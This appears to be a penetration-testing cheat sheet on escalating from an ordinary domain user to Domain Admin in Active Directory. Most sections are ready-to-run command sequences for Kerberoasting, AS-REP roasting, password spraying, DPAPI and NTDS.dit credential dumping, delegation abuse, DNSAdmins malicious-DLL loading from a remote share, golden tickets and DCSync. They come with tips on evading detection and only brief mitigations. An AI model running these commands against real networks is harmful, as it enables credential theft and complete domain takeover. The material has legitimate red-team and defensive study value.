## Domain Privilege Escalation

This document covers techniques for escalating privileges from a standard domain user to Domain Admin or SYSTEM. Each technique includes explanations of how it works, requirements, and tools to use.

---

## Core Concepts to Master

### 1. **Kerberos Service Principal Names (SPNs)**
- **SPN Structure:** Understanding service/hostname format
- **Service Account Types:** User accounts vs. computer accounts vs. gMSAs
- **SPN Registration:** How services register with AD
- **Ticket Encryption:** RC4-HMAC vs. AES encryption for service tickets
- **Service Ticket Lifetime:** Default validity and renewal
- **Pre-authentication:** Why it's required and when it's not

### 2. **Active Directory Permissions & ACLs**
- **Access Control Entries (ACEs):** Individual permission records
- **Access Control Lists (ACLs):** Collections of ACEs on objects
- **Extended Rights:** Special permissions beyond basic read/write
- **Generic Rights:** GenericAll, GenericWrite, WriteProperty
- **Privilege Escalation Paths:** Chains of permissions leading to DA
- **Discretionary vs. System ACLs:** DACL vs. SACL

### 3. **Delegation Mechanisms**
- **Unconstrained Delegation:** Full impersonation capability
- **Constrained Delegation:** Limited to specific services (S4U2Proxy)
- **Resource-Based Constrained Delegation (RBCD):** Resource-controlled delegation
- **Protocol Transition:** S4U2Self extension
- **TrustedToAuthForDelegation Flag:** What it means and implications
- **msDS-AllowedToActOnBehalfOfOtherIdentity:** RBCD attribute

### 4. **Group Policy Objects (GPOs)**
- **GPO Structure:** Computer vs. User configuration
- **GPO Application:** Filtering, WMI filters, security filtering
- **Local Administrator Assignment:** Restricted Groups vs. GPP
- **GPO Permissions:** Who can create/modify/link GPOs
- **GPO Delegation:** Granting GPO modification rights
- **Sysvol and NETLOGON Shares:** Where GPO files are stored

### 5. **Active Directory Certificate Services (ADCS)**
- **Certificate Templates:** Configuration and permissions
- **Certificate Enrollment:** Who can request which templates
- **Certificate-Based Authentication:** How certs authenticate users
- **Extended Key Usage (EKU):** Certificate purposes
- **Subject Alternative Name (SAN):** Specifying certificate subject
- **Certificate Authority (CA) Permissions:** Enrollment and management rights

### 6. **Windows Cryptography & Authentication**
- **NTLM Hashes:** MD4 hash of password
- **NTLMv2 Protocol:** Challenge-response authentication
- **Kerberos vs. NTLM:** When each is used
- **DPAPI (Data Protection API):** Credential encryption
- **Master Keys:** Encryption keys for DPAPI
- **Volume Shadow Copy:** Point-in-time snapshots

### 7. **Windows Services & Privileges**
- **SeBackupPrivilege:** Bypass file permissions for reading
- **SeRestorePrivilege:** Bypass file permissions for writing
- **SeDebugPrivilege:** Access to all processes
- **SeImpersonatePrivilege:** Token impersonation capability
- **Service Account Context:** LocalSystem, NetworkService, LocalService
- **DNS Server Privileges:** DNSAdmins group capabilities

### 8. **Trust Relationships**
- **Domain Trust Types:** Parent-child, tree-root, external, forest
- **Trust Direction:** One-way vs. bidirectional
- **SID Filtering:** Cross-domain SID validation
- **SID History:** Legacy attribute for migrations
- **Enterprise Admins:** Forest-wide administrative group
- **Cross-Domain Privilege Escalation:** Child to parent domain

---

### Kerberoast

**What is Kerberoasting?** 
An attack that exploits service accounts in Active Directory. Standard domain users can request Kerberos TGS (Ticket Granting Service) tickets for any SPN (Service Principal Name) bound to a user account. The TGS is encrypted with the service account's password hash, which can be extracted and cracked offline.

**How it works:**
1. Request TGS tickets for SPNs registered to user accounts (not computer accounts)
2. Extract the encrypted portion (encrypted with the service account's NTLM hash)
3. Crack offline using Hashcat or John the Ripper
4. If successful, you obtain the plaintext password of the service account

**Requirements:** Any domain user account

**Defense:** Use strong passwords (25+ characters) for service accounts, use Group Managed Service Accounts (gMSAs)

- PowerView:

  ```powershell
  #Get User Accounts that are used as Service Accounts
  Get-NetUser -SPN

  #Get every available SPN account, request a TGS and dump its hash
  Invoke-Kerberoast

  #Requesting the TGS for a single account:
  Request-SPNTicket

  #Export all tickets using Mimikatz
  Invoke-Mimikatz -Command '"kerberos::list /export"'
  ```

- AD Module:

  ```powershell
  #Get User Accounts that are used as Service Accounts
  Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
  ```

- Impacket:

  ```powershell
  python GetUserSPNs.py <DomainName>/<DomainUser>:<Password> -outputfile <FileName>
  ```

- Rubeus:

  ```powershell
  #Kerberoasting and outputing on a file with a specific format
  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName>

  #Kerberoasting whle being "OPSEC" safe, essentially while not try to roast AES enabled accounts
  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /rc4opsec

  #Kerberoast AES enabled accounts
  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /aes

  #Kerberoast specific user account
  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /user:<username> /simple

  #Kerberoast by specifying the authentication credentials
  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /creduser:<username> /credpassword:<password>
  ```

### ASREPRoast

**What is ASREPRoasting?** 
An attack targeting user accounts that have Kerberos pre-authentication disabled. Without pre-auth, you can request a TGT (Ticket Granting Ticket) for these accounts without knowing their password. The TGT contains data encrypted with the user's password hash, which can be cracked offline.

**How it works:**
1. Identify accounts with "Do not require Kerberos preauthentication" enabled
2. Request AS-REP (Authentication Service Response) for these accounts
3. Extract the encrypted portion and crack offline
4. Obtain plaintext password

**Requirements:** Domain user account or anonymous/guest access to enumerate users

**Why accounts have pre-auth disabled:** Usually legacy application compatibility or misconfiguration

- PowerView: `Get-DomainUser -PreauthNotRequired -Verbose`
- AD Module: `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth`

**Forcefully Disable Kerberos Preauth** (if you have write permissions):
Check for interesting permissions on accounts:

**Hint:** We add a filter e.g. RDPUsers to get "User Accounts" not Machine Accounts, because Machine Account hashes are not crackable!

PowerView:

```powershell
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
Disable Kerberos Preauth:
Set-DomainObject -Identity <UserAccount> -XOR @{useraccountcontrol=4194304} -Verbose
Check if the value changed:
Get-DomainUser -PreauthNotRequired -Verbose
```

- And finally execute the attack using the [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast) tool.

  ```powershell
  #Get a specific Accounts hash:
  Get-ASREPHash -UserName <UserName> -Verbose

  #Get any ASREPRoastable Users hashes:
  Invoke-ASREPRoast -Verbose
  ```

- Using Rubeus:

  ```powershell
  #Trying the attack for all domain users
  Rubeus.exe asreproast /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>

  #ASREPRoast specific user
  Rubeus.exe asreproast /user:<username> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>

  #ASREPRoast users of a specific OU (Organization Unit)
  Rubeus.exe asreproast /ou:<OUName> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
  ```

- Using Impacket:

  ```powershell
  #Trying the attack for the specified users on the file
  python GetNPUsers.py <domain_name>/ -usersfile <users_file> -outputfile <FileName>
  ```

### Password Spray Attack

**What is Password Spraying?** 
A brute-force technique that tries a small number of common passwords against many user accounts, avoiding account lockouts (which typically trigger after multiple failed attempts on a single account).

**How it works:**
1. Enumerate valid usernames from AD
2. Select common passwords (e.g., Season+Year like "Winter2024!", "Password123")
3. Try one password against all accounts, wait (respecting lockout policy), then try next password
4. Avoid triggering lockout policies by staying under the threshold

**Requirements:** List of valid usernames

**Best practices:** 
- Check domain lockout policy first (`net accounts /domain`)
- Space attempts to avoid detection
- Use passwords likely to be in use (company name, season+year, common patterns)

If we have harvest some passwords by compromising a user account, we can use this method to try and exploit password reuse
on other domain accounts.

**Tools:**

- [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
- [Invoke-CleverSpray](https://github.com/wavestone-cdt/Invoke-CleverSpray)
- [Spray](https://github.com/Greenwolf/Spray)

### Force Set SPN

**What is Targeted Kerberoasting (Force SPN)?** 
If you have GenericAll/GenericWrite permissions over a user account object, you can set an SPN on that account, making it Kerberoastable even if it wasn't originally a service account.

**How it works:**
1. Identify accounts you have write permissions over
2. Set an arbitrary SPN on the target account
3. Request a TGS for that SPN
4. Extract and crack the ticket offline
5. Clean up by removing the SPN (optional, for stealth)

**Requirements:** GenericAll, GenericWrite, or WriteProperty permissions on a user object

**Why this works:** AD doesn't validate if the SPN is legitimate; any user account can have SPNs set

- PowerView:

  ```powershell
  #Check for interesting permissions on accounts:
  Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}

  #Check if current user has already an SPN setted:
  Get-DomainUser -Identity <UserName> | select serviceprincipalname

  #Force set the SPN on the account:
  Set-DomainObject <UserName> -Set @{serviceprincipalname='ops/whatever1'}
  ```

- AD Module:

  ```powershell
  #Check if current user has already an SPN setted
  Get-ADUser -Identity <UserName> -Properties ServicePrincipalName | select ServicePrincipalName

  #Force set the SPN on the account:
  Set-ADUser -Identiny <UserName> -ServicePrincipalNames @{Add='ops/whatever1'}
  ```

Finally use any tool from before to grab the hash and kerberoast it!

### Abusing Shadow Copies

**What are Shadow Copies?** 
Windows Volume Shadow Copy Service (VSS) creates point-in-time snapshots of volumes. If shadow copies exist on a Domain Controller or member server, they may contain older versions of sensitive files, including the NTDS.dit database or registry hives.

**How it works:**
1. Enumerate existing shadow copies
2. Mount/access the shadow copy
3. Extract sensitive files (SAM, SYSTEM, NTDS.dit)
4. Dump credentials offline

**Requirements:** Local administrator access on the target machine

**Why this is valuable:** 
- Backups may contain credentials for accounts that have since changed passwords
- Deleted files may still exist in shadow copies
- DPAPI masterkeys and certificates may be recoverable

If you have local administrator access on a machine try to list shadow copies, it's an easy way for Domain Escalation.

```powershell
#List shadow copies using vssadmin (Needs Admnistrator Access)
vssadmin list shadows

#List shadow copies using diskshadow
diskshadow list shadows all

#Make a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

1. You can dump the backuped SAM database and harvest credentials.
2. Look for DPAPI stored creds and decrypt them.
3. Access backuped sensitive files.

### List and Decrypt Stored Credentials using Mimikatz

**What is DPAPI?** 
Data Protection API (DPAPI) is Windows' mechanism for encrypting sensitive data (saved credentials, certificates, browser passwords, etc.). Encryption uses a "master key" derived from the user's password.

**How DPAPI works:**
1. User/application stores sensitive data
2. DPAPI encrypts it with a Master Key
3. Master Key is encrypted with user's password hash
4. Encrypted data and Master Key GUIDs are stored on disk

**Decryption process:**
1. Identify encrypted credential blobs
2. Find the corresponding Master Key
3. Decrypt Master Key (using user context or domain controller's backup)
4. Decrypt the credential

**Requirements:** User context or SYSTEM, or domain admin (for /rpc flag)

Usually encrypted credentials are stored in:

- `%appdata%\Microsoft\Credentials`
- `%localappdata%\Microsoft\Credentials`

```powershell
#By using the cred function of mimikatz we can enumerate the cred object and get information about it:
dpapi::cred /in:"%appdata%\Microsoft\Credentials\<CredHash>"

#From the previous command we are interested to the "guidMasterKey" parameter, that tells us which masterkey was used to encrypt the credential
#Lets enumerate the Master Key:
dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<usersid>\<MasterKeyGUID>"

#Now if we are on the context of the user (or system) that the credential belogs to, we can use the /rpc flag to pass the decryption of the masterkey to the domain controler:
dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<usersid>\<MasterKeyGUID>" /rpc

#We now have the masterkey in our local cache:
dpapi::cache

#Finally we can decrypt the credential using the cached masterkey:
dpapi::cred /in:"%appdata%\Microsoft\Credentials\<CredHash>"
```

Detailed Article:
[DPAPI all the things](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials)

### Unconstrained Delegation

**What is Unconstrained Delegation?** 
A Kerberos feature allowing a service to impersonate users to any service. When enabled on a computer, any user authenticating to it sends a copy of their TGT, which is stored in memory. If you compromise this machine, you can extract and reuse these TGTs.

**How it works:**
1. User authenticates to a machine with Unconstrained Delegation enabled
2. User's TGT is sent and cached on that machine
3. Attacker with admin access extracts the TGT from memory
4. Attacker performs Pass-the-Ticket (PTT) to impersonate the user

**Requirements:** 
- Administrative access on a machine with Unconstrained Delegation
- Wait for/trick a high-value target to authenticate to it

**Attack vector:** Force authentication using printer bug, PetitPotam, or similar coercion techniques

**Why this is dangerous:** Domain Controllers have Unconstrained Delegation by default; compromising another machine with this setting can lead to DA

Using PowerView:

```powershell
#Discover domain joined computers that have Unconstrained Delegation enabled
Get-NetComputer -UnConstrained

#List tickets and check if a DA or some High Value target has stored its TGT
Invoke-Mimikatz -Command '"sekurlsa::tickets"'

#Command to monitor any incoming sessions on our compromised server
Invoke-UserHunter -ComputerName <NameOfTheComputer> -Poll <TimeOfMonitoringInSeconds> -UserName <UserToMonitorFor> -Delay
<WaitInterval> -Verbose

#Dump the tickets to disk:
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

#Impersonate the user using ptt attack:
Invoke-Mimikatz -Command '"kerberos::ptt <PathToTicket>"'
```

**Note:** We can also use Rubeus!

### Constrained Delegation

**What is Constrained Delegation?** 
A more restrictive form of delegation where a service can only impersonate users to specific services (defined in the account's msDS-AllowedToDelegateTo attribute).

**How it works:**
1. Service account is configured with constrained delegation to specific SPNs
2. Account has the TRUSTED_TO_AUTH_FOR_DELEGATION flag
3. Using S4U2Self and S4U2Proxy Kerberos extensions, you can request tickets on behalf of any user
4. These tickets can be used to authenticate to the allowed services

**Requirements:** 
- Compromise an account with constrained delegation configured
- Know the account's password or hash (or use Rubeus tgtdeleg trick)

**Attack scenarios:**
- Escalate from a service account to accessing sensitive services
- Abuse alternative service names to access unintended services (e.g., TIME → CIFS)

Using PowerView and Kekeo:

```powershell
#Enumerate Users and Computers with constrained delegation
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

#If we have a user that has Constrained delegation, we ask for a valid tgt of this user using kekeo
tgt::ask /user:<UserName> /domain:<Domain's FQDN> /rc4:<hashedPasswordOfTheUser>

#Then using the TGT we have ask a TGS for a Service this user has Access to through constrained delegation
tgs::s4u /tgt:<PathToTGT> /user:<UserToImpersonate>@<Domain's FQDN> /service:<Service's SPN>

#Finally use mimikatz to ptt the TGS
Invoke-Mimikatz -Command '"kerberos::ptt <PathToTGS>"'
```

_ALTERNATIVE:_
Using Rubeus:

```powershell
Rubeus.exe s4u /user:<UserName> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<UserToImpersonate> /msdsspn:"<Service's SPN>" /altservice:<Optional> /ptt
```

Now we can access the service as the impersonated user!

:triangular_flag_on_post: **What if we have delegation rights for only a specific SPN? (e.g TIME):**

In this case we can still abuse a feature of kerberos called "alternative service". This allows us to request TGS tickets for other "alternative" services and not only for the one we have rights for. Thats gives us the leverage to request valid tickets for any service we want that the host supports, giving us full access over the target machine.

### Resource Based Constrained Delegation

**What is Resource-Based Constrained Delegation (RBCD)?** 
A delegation model where the resource (target computer) specifies which accounts are allowed to delegate to it (opposite of traditional constrained delegation). If you have GenericAll/GenericWrite over a computer object, you can configure RBCD and impersonate any user to that machine.

**How it works:**
1. You have write access to a computer object's msDS-AllowedToActOnBehalfOfOtherIdentity attribute
2. Create a new machine account (or use one you control)
3. Configure the target computer to allow your machine account to delegate to it
4. Use S4U2Self/S4U2Proxy to impersonate any user (including Domain Admin)
5. Access the target machine as that user

**Requirements:** 
- GenericAll/GenericWrite permissions on a computer object
- Ability to create machine accounts (default: 10 per user via ms-DS-MachineAccountQuota)

**Why this is powerful:** 
- Doesn't require domain admin
- Self-service delegation configuration
- Can impersonate any user, including admins

**TL;DR:** If we have GenericALL/GenericWrite privileges on a machine account object of a domain, we can abuse it and impersonate ourselves as any user of the domain to it. For example we can impersonate Domain Administrator and have complete access.

Tools we are going to use:

- [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon)
- [Powermad](https://github.com/Kevin-Robertson/Powermad)
- [Rubeus](https://github.com/GhostPack/Rubeus)

First we need to enter the security context of the user/machine account that has the privileges over the object.
If it is a user account we can use Pass the Hash, RDP, PSCredentials etc.

Exploitation Example:

```powershell
#Import Powermad and use it to create a new MACHINE ACCOUNT
. .\Powermad.ps1
New-MachineAccount -MachineAccount <MachineAccountName> -Password $(ConvertTo-SecureString 'p@ssword!' -AsPlainText -Force) -Verbose

#Import PowerView and get the SID of our new created machine account
. .\PowerView.ps1
$ComputerSid = Get-DomainComputer <MachineAccountName> -Properties objectsid | Select -Expand objectsid

#Then by using the SID we are going to build an ACE for the new created machine account using a raw security descriptor:
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

#Next, we need to set the security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView
Get-DomainComputer TargetMachine | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose

#After that we need to get the RC4 hash of the new machine account's password using Rubeus
Rubeus.exe hash /password:'p@ssword!'

#And for this example, we are going to impersonate Domain Administrator on the cifs service of the target computer using Rubeus
Rubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:Administrator /msdsspn:cifs/TargetMachine.wtver.domain /domain:wtver.domain /ptt

#Finally we can access the C$ drive of the target machine
dir \\TargetMachine.wtver.domain\C$
```

Detailed Articles:

- [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [RESOURCE-BASED CONSTRAINED DELEGATION ABUSE](https://blog.stealthbits.com/resource-based-constrained-delegation-abuse/)

:exclamation: In Constrain and Resource-Based Constrained Delegation if we don't have the password/hash of the account with TRUSTED_TO_AUTH_FOR_DELEGATION that we try to abuse, we can use the very nice trick "tgt::deleg" from kekeo or "tgtdeleg" from rubeus and fool Kerberos to give us a valid TGT for that account. Then we just use the ticket instead of the hash of the account to perform the attack.

```powershell
#Command on Rubeus
Rubeus.exe tgtdeleg /nowrap
```

Detailed Article:
[Rubeus – Now With More Kekeo](https://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/)

### DNSAdmins Abuse

**What is DNSAdmins Abuse?** 
Members of the DNSAdmins group can load arbitrary DLLs into the DNS service (dns.exe), which runs as SYSTEM. If the DC is also the DNS server, this leads to privilege escalation to Domain Admin.

**How it works:**
1. Compromise a member of DNSAdmins group
2. Create a malicious DLL (reverse shell, credential dumper, etc.)
3. Host the DLL on an SMB share you control
4. Configure DNS service to load your DLL using dnscmd
5. Restart DNS service (requires privileges)
6. DLL executes as SYSTEM

**Requirements:** 
- Membership in DNSAdmins group
- Privileges to restart DNS service
- DNS service running on a Domain Controller (common setup)

**Mitigation:** Monitor DNSAdmins group membership, audit registry changes to DNS service configuration

_WUT IS DIS ?: If a user is a member of the DNSAdmins group, he can possibly load an arbitary DLL with the privileges of dns.exe that runs as SYSTEM. In case the DC serves a DNS, the user can escalate his privileges to DA. This exploitation process needs privileges to restart the DNS service to work._

1. Enumerate the members of the DNSAdmins group:
   - PowerView: `Get-NetGroupMember -GroupName "DNSAdmins"`
   - AD Module: `Get-ADGroupMember -Identiny DNSAdmins`
2. Once we found a member of this group we need to compromise it (There are many ways).
3. Then by serving a malicious DLL on a SMB share and configuring the dll usage,we can escalate our privileges:

   ```powershell
   #Using dnscmd:
   dnscmd <NameOfDNSMAchine> /config /serverlevelplugindll \\Path\To\Our\Dll\malicious.dll

   #Restart the DNS Service:
   sc \\DNSServer stop dns
   sc \\DNSServer start dns
   ```

### Abusing Active Directory-Integrated DNS

**What is AD-Integrated DNS Abuse?** 
Active Directory-Integrated DNS stores DNS records in AD, allowing authenticated users to create/modify DNS records. Attackers can create wildcard records, poison DNS, or redirect traffic for man-in-the-middle attacks.

**Attack scenarios:**
- Create DNS records to redirect traffic
- DNS poisoning for NTLM relay attacks
- Wildcard record creation for credential harvesting
- WPAD/LLMNR/NBT-NS poisoning alternatives

**Requirements:** Authenticated domain user (by default, users can create DNS records)

- [Exploiting Active Directory-Integrated DNS](https://blog.netspi.com/exploiting-adidns/)
- [ADIDNS Revisited](https://blog.netspi.com/adidns-revisited/)
- [Inveigh](https://github.com/Kevin-Robertson/Inveigh)

### Abusing Backup Operators Group

**What is Backup Operators Abuse?** 
Members of the Backup Operators group have SeBackupPrivilege and SeRestorePrivilege, allowing them to read/write any file on the system regardless of ACLs. This can be abused to access the NTDS.dit database and SYSTEM hive, dump all domain credentials, and escalate to Domain Admin.

**How it works:**
1. Compromise an account in Backup Operators group
2. Create a shadow copy of the Domain Controller's C:\ drive
3. Use SeBackupPrivilege to copy NTDS.dit from the shadow copy
4. Export the SYSTEM registry hive
5. Transfer files off the DC
6. Use secretsdump.py to extract all domain password hashes
7. Pass-the-Hash to gain Domain Admin access

**Requirements:** 
- Membership in Backup Operators group
- Access to a Domain Controller

**Why this works:** Backup software needs to read all files; this privilege bypasses normal file permissions

_WUT IS DIS ?: If we manage to compromise a user account that is member of the Backup Operators
group, we can then abuse it's SeBackupPrivilege to create a shadow copy of the current state of the DC,
extract the ntds.dit database file, dump the hashes and escalate our privileges to DA._

1. Once we have access on an account that has the SeBackupPrivilege we can access the DC and create a shadow copy using the signed binary diskshadow:

   ```powershell
   #Create a .txt file that will contain the shadow copy process script
   Script ->{
   set context persistent nowriters
   set metadata c:\windows\system32\spool\drivers\color\example.cab
   set verbose on
   begin backup
   add volume c: alias mydrive

   create

   expose %mydrive% w:
   end backup
   }

   #Execute diskshadow with our script as parameter
   diskshadow /s script.txt
   ```

2. Next we need to access the shadow copy, we may have the SeBackupPrivilege but we cant just
   simply copy-paste ntds.dit, we need to mimic a backup software and use Win32 API calls to copy it on an accessible folder. For this we are
   going to use [this](https://github.com/giuliano108/SeBackupPrivilege) amazing repo:

   ```powershell
   #Importing both dlls from the repo using powershell
   Import-Module .\SeBackupPrivilegeCmdLets.dll
   Import-Module .\SeBackupPrivilegeUtils.dll

   #Checking if the SeBackupPrivilege is enabled
   Get-SeBackupPrivilege

   #If it isn't we enable it
   Set-SeBackupPrivilege

   #Use the functionality of the dlls to copy the ntds.dit database file from the shadow copy to a location of our choice
   Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\<PathToSave>\ntds.dit -Overwrite

   #Dump the SYSTEM hive
   reg save HKLM\SYSTEM c:\temp\system.hive
   ```

3. Using smbclient.py from impacket or some other tool we copy ntds.dit and the SYSTEM hive on our local machine.
4. Use secretsdump.py from impacket and dump the hashes.
5. Use psexec or another tool of your choice to PTH and get Domain Admin access.

### Abusing Exchange

**What is Exchange Privilege Escalation?** 
Microsoft Exchange servers often have high privileges in Active Directory (WriteDacl on domain object). Compromising an Exchange server or account with Exchange permissions can lead to privilege escalation to Domain Admin.

**Common attacks:**
- **PrivExchange:** Coerce Exchange server to authenticate to attacker, relay to LDAP, grant DCSync rights
- **CVE-2020-0688:** RCE via fixed cryptographic keys in Exchange
- **NTLM Relay:** Relay Exchange authentication to LDAP/SMB for privilege escalation

**Requirements:** Mailbox access or compromise of Exchange server

**Why Exchange is dangerous:** 
- Exchange servers have WriteDacl on domain by default
- Often run as highly privileged service accounts
- Exposed to users via OWA/mail protocols

- [Abusing Exchange one Api call from DA](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
- [CVE-2020-0688](https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys)
- [PrivExchange](https://github.com/dirkjanm/PrivExchange) Exchange your privileges for Domain Admin privs by abusing Exchange

### Weaponizing Printer Bug

**What is the Printer Bug (SpoolSample)?** 
A feature in the Windows Print Spooler service that allows any authenticated user to coerce a remote machine (including Domain Controllers) to authenticate to an attacker-controlled host using the machine account.

**How it works:**
1. Trigger the RpcRemoteFindFirstPrinterChangeNotification RPC call
2. Target machine authenticates to attacker's server with its machine account
3. Capture/relay the authentication
4. Common combinations:
   - Printer Bug + Unconstrained Delegation = Capture DC TGT
   - Printer Bug + NTLM Relay = Escalate privileges

**Requirements:** Authenticated domain user

**Use cases:**
- Force DC to authenticate to compromised server with Unconstrained Delegation
- NTLM relay attacks
- Capture machine account credentials

**Mitigations:** Disable Print Spooler service on DCs, SMB signing, LDAP signing

- [Printer Server Bug to Domain Administrator](https://www.dionach.com/blog/printer-server-bug-to-domain-administrator/)
- [NetNTLMtoSilverTicket](https://github.com/NotMedic/NetNTLMtoSilverTicket)

### Abusing ACLs

**What is ACL Abuse?** 
Active Directory uses Access Control Lists (ACLs) to define permissions on objects. Misconfigurations or excessive permissions can create privilege escalation paths. Common abusable permissions include GenericAll, WriteDacl, WriteOwner, and others.

**Common ACL abuse scenarios:**
- **GenericAll:** Full control over object (reset password, add to group, etc.)
- **WriteDacl:** Modify object's ACL to grant yourself more permissions
- **WriteOwner:** Change object's owner to yourself, then modify permissions
- **ForceChangePassword:** Reset user's password
- **AddMember:** Add yourself to privileged groups

**Attack chain example:**
1. User A has WriteDacl on User B
2. User B is member of Domain Admins
3. User A grants themselves ForceChangePassword on User B
4. User A resets User B's password
5. User A authenticates as User B (Domain Admin)

**Requirements:** Permissions on objects in the privilege escalation path

**Tools:** BloodHound excels at visualizing these paths

- [Escalating privileges with ACLs in Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [aclpwn.py](https://github.com/fox-it/aclpwn.py)
- [Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn)

### Abusing IPv6 with mitm6

**What is mitm6?** 
A tool that exploits the default Windows configuration of preferring IPv6 over IPv4. By acting as a rogue IPv6 DNS server, mitm6 can perform man-in-the-middle attacks, capture credentials, and relay authentication.

**How it works:**
1. Windows prefers IPv6 but most networks only use IPv4
2. Windows sends DHCPv6 requests
3. mitm6 responds, configuring itself as the DNS server
4. All DNS queries go through mitm6
5. mitm6 performs NTLM relay attacks to LDAP/SMB
6. Can modify ACLs, create computer accounts, or escalate privileges

**Requirements:** Network access to target subnet

**Attack combinations:**
- mitm6 + ntlmrelayx = Relay to LDAP, grant DCSync rights
- mitm6 + responder = Credential harvesting

**Mitigations:** 
- Disable IPv6 if not used
- Enable LDAP signing and SMB signing
- Block DHCPv6 traffic if not needed

- [Compromising IPv4 networks via IPv6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
- [mitm6](https://github.com/fox-it/mitm6)

### SID History Abuse

**What is SID History Abuse?** 
SID History is an AD attribute designed for domain migrations, allowing users to retain access to resources from their old domain. If SID Filtering is disabled between domains in a forest, you can forge a Golden Ticket with extra SIDs (like Enterprise Admins) to escalate from child domain admin to forest root domain admin.

**How it works:**
1. Compromise a child domain (easier target than root)
2. Obtain the child domain's krbtgt hash
3. Craft a Golden Ticket for a child domain user
4. Add the Enterprise Admins SID (RootDomainSID-519) to the SID History field
5. Use the ticket to access resources in the root domain as Enterprise Admin

**Requirements:** 
- Domain Admin in child domain (to get krbtgt hash)
- SID Filtering disabled (default in forest trust relationships)

**Why this works:** 
- Kerberos trusts the SID History field in tickets
- SID Filtering is typically only enabled for external trusts, not within forests
- Enterprise Admins group exists in root but has privileges across all domains

**Mitigations:** Enable SID Filtering (breaks some legitimate scenarios), monitor Golden Ticket indicators

_WUT IS DIS?: If we manage to compromise a child domain of a forest and [SID filtering](https://www.itprotoday.com/windows-8/sid-filtering) isn't enabled (most of the times is not), we can abuse it to privilege escalate to Domain Administrator of the root domain of the forest. This is possible because of the [SID History](https://www.itprotoday.com/windows-8/sid-history) field on a kerberos TGT ticket, that defines the "extra" security groups and privileges._

Exploitation example:

```powershell
#Get the SID of the Current Domain using PowerView
Get-DomainSID -Domain current.root.domain.local

#Get the SID of the Root Domain using PowerView
Get-DomainSID -Domain root.domain.local

#Create the Enteprise Admins SID
Format: RootDomainSID-519

#Forge "Extra" Golden Ticket using mimikatz
kerberos::golden /user:Administrator /domain:current.root.domain.local /sid:<CurrentDomainSID> /krbtgt:<krbtgtHash> /sids:<EnterpriseAdminsSID> /startoffset:0 /endin:600 /renewmax:10080 /ticket:\path\to\ticket\golden.kirbi

#Inject the ticket into memory
kerberos::ptt \path\to\ticket\golden.kirbi

#List the DC of the Root Domain
dir \\dc.root.domain.local\C$

#Or DCsync and dump the hashes using mimikatz
lsadump::dcsync /domain:root.domain.local /all
```

Detailed Articles:

- [Kerberos Golden Tickets are Now More Golden](https://adsecurity.org/?p=1640)
- [A Guide to Attacking Domain Trusts](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)

### Exploiting SharePoint

**What is SharePoint Exploitation?** 
SharePoint servers often run with high privileges and contain sensitive data. Known vulnerabilities can lead to remote code execution, often with SYSTEM or service account privileges. Compromising SharePoint can be a path to domain escalation.

**Common vulnerabilities:**
- **CVE-2019-0604:** RCE via deserialization
- **CVE-2019-1257:** Code execution through BDC deserialization
- **CVE-2020-0932:** RCE using TypeConverters

**Why SharePoint is valuable:**
- Runs as privileged service account
- Contains sensitive documents and credentials
- Often has access to multiple data sources
- May have configured with overly permissive service accounts

**Requirements:** Access to SharePoint instance, vulnerable version

- [CVE-2019-0604](https://medium.com/@gorkemkaradeniz/sharepoint-cve-2019-0604-rce-exploitation-ab3056623b7d) RCE Exploitation \
  [PoC](https://github.com/k8gege/CVE-2019-0604)
- [CVE-2019-1257](https://www.zerodayinitiative.com/blog/2019/9/18/cve-2019-1257-code-execution-on-microsoft-sharepoint-through-bdc-deserialization) Code execution through BDC deserialization
- [CVE-2020-0932](https://www.zerodayinitiative.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters) RCE using typeconverters \
